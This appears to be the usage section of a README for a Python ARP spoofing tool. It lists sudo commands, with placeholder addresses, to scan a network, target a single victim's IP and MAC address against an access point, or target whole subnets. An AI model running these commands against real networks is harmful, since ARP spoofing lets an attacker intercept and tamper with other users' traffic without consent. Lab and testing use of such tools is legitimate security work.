How to Use

[+] Scanning a network
sudo python Arp_spoof.py -s <Access point ip address>

[+] Targeting single Access Point or Victims
sudo python Arp_spoof.py -t <target ip address> -r <Accesspoint ip Address> -m <target mac Address>

[+] Targeting Sub Nets
sudo python Arp_spoof.py -a <Access point ip address>
